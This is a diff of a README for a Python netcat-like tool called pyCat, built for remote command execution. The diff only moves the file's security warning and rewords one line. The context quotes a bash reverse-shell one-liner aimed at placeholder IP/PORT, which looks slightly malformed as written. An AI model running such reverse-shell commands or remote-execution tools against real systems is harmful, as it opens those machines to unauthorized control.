@@ -3,9 +3,6 @@ Simple python-based client/server for interacting with remote systems.
 No installation necessary. 
 Just drop and run.
 
-WARNING!
----------
-You will be opening up a system to remote command execution if you run this!
 
 Why pyCat?
 ----------
@@ -21,11 +18,16 @@ Plus sometimes the shells I get using...
   
   `/bin/bash -c '/bin/bash>/dev/null/IP/PORT 2>&1 0>&1'`
   
-...can be inconsistent in the way they act from time to time.
+...can be inconsistent or unpredictable in the way they act from time to time.
 
 
 
 So, I found myself wanting to have a stand-alone executable of Netcat for Linux systems, but didn't find one after searching for a **SOLID** 10 minutes. It also had the added benefit of being a good way to learn more Python.
+
+
+WARNING!
+---------
+You will be opening up a system to remote command execution if you run this!
 
 
 Thanks to **Justin** for helping me debug the socket connection.
